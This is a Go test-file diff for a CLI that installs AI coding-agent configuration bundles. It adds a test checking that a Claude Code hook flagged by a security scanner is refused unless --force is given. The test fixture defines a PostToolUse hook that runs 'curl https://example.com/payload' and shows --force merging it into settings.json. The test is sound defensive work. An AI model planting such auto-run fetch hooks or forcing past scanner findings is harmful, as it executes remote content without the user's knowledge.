@@ -1145,6 +1145,8 @@ func resetLoadoutApplyFlags() {
 	loadoutApplyCmd.Flags().Set("base-dir", "")
 	loadoutApplyCmd.Flags().Set("to", "")
 	loadoutApplyCmd.Flags().Set("method", "symlink")
+	loadoutApplyCmd.Flags().Set("skip-unsupported", "false")
+	loadoutApplyCmd.Flags().Set("force", "false")
 }
 
 func TestRunLoadoutApply_EmptyLibraryReturnsNil(t *testing.T) {
@@ -1303,6 +1305,42 @@ func TestRunLoadoutApply_SnapshotAlreadyActiveConflicts(t *testing.T) {
 	}
 	if !strings.Contains(err.Error(), "already active") {
 		t.Errorf("error should mention already active, got %v", err)
+	}
+}
+
+// A hook with high-severity scanner findings fails keep with a hint to
+// --force, and --force applies it.
+func TestRunLoadoutApply_HighFindingHookNeedsForce(t *testing.T) {
+	root := setupLoadoutApplyRepo(t, "risky", "claude-code",
+		map[string][]string{"hooks": {"fetcher"}})
+	home := t.TempDir()
+	t.Setenv("HOME", home)
+	origDir := config.GlobalDirOverride
+	config.GlobalDirOverride = t.TempDir()
+	t.Cleanup(func() { config.GlobalDirOverride = origDir })
+	hookDir := filepath.Join(root, "hooks", "claude-code", "fetcher")
+	os.MkdirAll(hookDir, 0755)
+	os.WriteFile(filepath.Join(hookDir, "hook.json"), []byte(`{"spec":"hooks/0.1","hooks":[{"event":"PostToolUse","handler":{"type":"command","command":"curl https://example.com/payload"}}]}`), 0644)
+	output.SetForTest(t)
+	loadoutApplyCmd.Flags().Set("keep", "true")
+	defer resetLoadoutApplyFlags()
+
+	err := loadoutApplyCmd.RunE(loadoutApplyCmd, []string{"risky"})
+	var se output.StructuredError
+	if !errors.As(err, &se) || !strings.Contains(se.Suggestion, "--force") {
+		t.Fatalf("keep: got %v, want an error suggesting --force", err)
+	}
+	if _, err := os.Stat(filepath.Join(home, ".claude", "settings.json")); !os.IsNotExist(err) {
+		t.Errorf("refused apply wrote settings.json (stat err %v)", err)
+	}
+
+	loadoutApplyCmd.Flags().Set("force", "true")
+	if err := loadoutApplyCmd.RunE(loadoutApplyCmd, []string{"risky"}); err != nil {
+		t.Fatalf("forced keep: %v", err)
+	}
+	data, _ := os.ReadFile(filepath.Join(home, ".claude", "settings.json"))
+	if !strings.Contains(string(data), "curl https://example.com/payload") {
+		t.Errorf("forced keep did not merge the hook: %s", data)
 	}
 }
 
